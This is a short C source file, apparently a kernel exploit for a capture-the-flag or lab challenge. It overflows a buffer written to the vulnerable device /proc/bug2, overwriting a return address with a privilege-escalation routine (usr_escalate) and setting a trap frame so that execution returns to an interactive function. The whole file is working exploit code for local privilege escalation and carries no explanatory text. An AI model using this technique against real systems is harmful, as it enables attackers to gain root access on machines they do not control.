#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<fcntl.h>
#include<sys/stat.h>
#include<stdint.h>
#include "template.h"

//author : afang
//comment: what a nice day, isn't it?!

void exploit(){

	printf("go real exploit!");
	char buf[40] = {0};
	memset(buf, 'A' , sizeof(buf));
	*((void**)(buf + 32)) = &usr_escalate;
	prepare_tf();
	tf.rip = &interactive;
	int fd = open("/proc/bug2", O_WRONLY);
	write(fd, buf , sizeof(buf));
}


int main(){

	exploit();
	return 0;
}

